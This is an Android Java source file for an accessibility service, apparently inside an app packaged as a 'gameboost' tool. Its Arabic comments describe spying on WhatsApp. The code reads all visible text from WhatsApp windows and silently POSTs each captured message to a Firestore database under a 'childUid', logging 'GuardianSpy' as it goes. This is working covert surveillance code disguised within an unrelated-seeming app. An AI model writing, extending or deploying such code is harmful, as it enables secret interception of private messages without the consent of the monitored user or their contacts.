package com.Ejram.gameboost;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class GuardianAccessibilityService extends AccessibilityService {

    private String lastCapturedText = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null) return;
        String packageName = event.getPackageName().toString();

        // التجسس على رسائل الواتساب
        if (packageName.contains("whatsapp") && event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                extractTextFromNode(rootNode, "WhatsApp");
            }
        }
    }

    private void extractTextFromNode(AccessibilityNodeInfo node, String appName) {
        if (node == null) return;
        if (node.getText() != null && node.getText().length() > 0) {
            String text = node.getText().toString();
            // نمنع إرسال نفس الرسالة مرتين
            if (!text.equals(lastCapturedText)) {
                lastCapturedText = text;
                sendToFirestore(appName, text);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            extractTextFromNode(node.getChild(i), appName);
        }
    }

    // إرسال البيانات للوحة الأب عبر (REST API) صامت وسريع
    private void sendToFirestore(String app, String msg) {
        SharedPreferences prefs = getSharedPreferences("GuardianPrefs", Context.MODE_PRIVATE);
        String uid = prefs.getString("childUid", "UNKNOWN");
        if (uid.equals("UNKNOWN")) return; // إذا لم يكن حساب طفل، توقف

        new Thread(() -> {
            try {
                URL url = new URL("https://firestore.googleapis.com/v1/projects/ejram-6b3b5/databases/(default)/documents/users/" + uid + "/messages");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setDoOutput(true);

                // تنظيف النص من الرموز التي قد تفسد الكود
                String safeMsg = msg.replace("\"", "\\\"").replace("\n", " ");
                String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
                
                String json = "{\"fields\": {" +
                        "\"app\": {\"stringValue\": \"" + app + "\"}," +
                        "\"text\": {\"stringValue\": \"" + safeMsg + "\"}," +
                        "\"time\": {\"stringValue\": \"" + time + "\"}" +
                        "}}";

                try(OutputStream os = conn.getOutputStream()) {
                    byte[] input = json.getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
                conn.getResponseCode(); 
                Log.d("GuardianSpy", "Message Sent!");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public void onInterrupt() {}
}
